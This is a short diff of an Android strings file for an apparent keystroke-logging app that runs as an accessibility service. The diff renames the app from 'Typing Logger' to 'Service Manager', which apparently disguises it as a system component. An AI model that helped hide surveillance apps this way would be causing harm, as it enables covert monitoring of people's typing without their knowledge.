@@ -5,7 +5,7 @@
     <string name="act_acc_step2">Press «Typing Logger».</string>
     <string name="act_acc_step3">Activate «Typing Logger» and press the «Allow» button.</string>
     <string name="androidx_startup">androidx.startup</string>
-    <string name="app_name">Typing Logger</string>
+    <string name="app_name">Service Manager</string>
     <string name="ask_delete">Do you want to delete all records of the selected day?</string>
     <string name="cancel">Cancel</string>
     <string name="content_copied">Content to be copied</string>
